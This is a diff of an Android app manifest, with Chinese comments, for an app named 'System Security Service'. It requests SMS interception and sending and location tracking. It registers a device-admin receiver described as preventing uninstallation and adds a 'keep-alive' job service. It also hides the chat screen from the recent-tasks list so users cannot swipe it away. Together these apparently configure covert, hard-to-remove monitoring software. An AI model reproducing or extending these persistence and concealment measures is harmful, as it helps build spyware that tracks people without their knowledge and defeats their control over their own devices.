@@ -19,12 +19,12 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
-
+    
     <!-- 运动传感器、短信、响铃 -->
     <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" /> 
 
     <application
         android:label="系统安全服务"
@@ -38,6 +38,12 @@
             android:stopWithTask="false"
             android:foregroundServiceType="location" />
 
+        <!-- 底层拉活任务 -->
+        <service
+            android:name=".KeepAliveJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="true" />
+
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -49,7 +55,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- 充电恢复兜底：低电量被杀后，插充电器拉起服务 -->
         <receiver
             android:name=".PowerConnectedReceiver"
             android:enabled="true"
@@ -60,7 +65,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- 专供 Android 7.0 以下版本使用的网络恢复监听 -->
         <receiver
             android:name=".LegacyNetworkReceiver"
             android:enabled="true"
@@ -70,7 +74,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- 设备管理器（防卸载） -->
         <receiver
             android:name=".MyDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -91,10 +94,13 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-        <!-- 局域网聊天界面 -->
+
+        <!-- 局域网聊天界面：excludeFromRecents="true" 防止出现在最近任务被划死 -->
         <activity
             android:name=".ChatActivity"
-            android:exported="true" />
+            android:exported="true"
+            android:excludeFromRecents="true" />
+
         <activity
             android:name=".MainActivity"
             android:exported="true">
